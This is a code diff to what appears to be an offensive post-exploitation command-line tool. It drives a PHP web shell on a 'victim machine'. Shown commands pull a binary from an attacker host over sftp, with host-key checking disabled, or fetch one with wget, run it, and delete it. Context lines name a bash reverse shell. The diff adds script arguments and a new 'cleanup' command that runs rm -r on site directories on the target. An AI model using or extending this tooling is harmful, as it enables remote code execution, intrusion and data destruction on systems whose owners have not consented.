@@ -123,7 +123,12 @@ def bash_reverse_shell(context: cloup.Context, lhost: str, lport: int) -> None:
     type=cloup.Path(exists=False),
     help="The filepath on the victim machine to save the file to. Please include the filename so it can be executed (e.g. ./linpeas).",
 )
-@cloup.option("--args", type=None)
+@cloup.option(
+    "--arg",
+    type=str,
+    multiple=True,
+    help="Specify a list of arguments to pass to the script.",
+)
 @cloup.constraints.mutually_exclusive(
     cloup.option(
         "--private-key-file",
@@ -151,6 +156,7 @@ def sftp(
     context: cloup.Context,
     attacker_source: str,
     victim_destination: str,
+    arg: list[str] | None,
     private_key_file: TextIO | None,
     private_key_contents: str | None,
     key_filepath: str | None,
@@ -179,9 +185,12 @@ def sftp(
         use_key = "/dev/stdin"
         key_cleanup = ""
 
+    if arg is None:
+        arg = []
+
     return context.obj.run(
         php_system(
-            f"{write_key} sftp -i {use_key} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {attacker_source} {victim_destination} 2>&1 && chmod u+x {victim_destination} && echo 'Starting {victim_destination}' && {victim_destination} 2>&1; rm {victim_destination}; {key_cleanup}"
+            f"{write_key} sftp -i {use_key} -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null {attacker_source} {victim_destination} 2>&1 && chmod u+x {victim_destination} && {victim_destination} {" ".join(arg)} 2>&1; rm {victim_destination}; {key_cleanup}"
         )
     )
 
@@ -201,6 +210,22 @@ def wget(context: cloup.Context, source_url: str, victim_destination: str) -> No
             f"wget -O {victim_destination} {source_url} && chmod u+x {victim_destination} && {victim_destination}; rm {victim_destination}"
         )
     )
+
+
+@cli.command(help="Runs the cleanup script on the target for given site names.")
+@cloup.argument(
+    "site_names",
+    type=str,
+    nargs=-1,
+    help="A list of site names to be deleted off of the target.",
+)
+@cloup.pass_context
+def cleanup(context: cloup.Context, site_names: list[str]):
+    rm_sites = map(
+        lambda site_name: f"rm -r $(pwd | sed -e 's:/htdocs/public/website::')/documents/website/{site_name}",
+        site_names,
+    )
+    return context.obj.run(php_system("; ".join(rm_sites)))
 
 
 def php_system(payload: str) -> str:
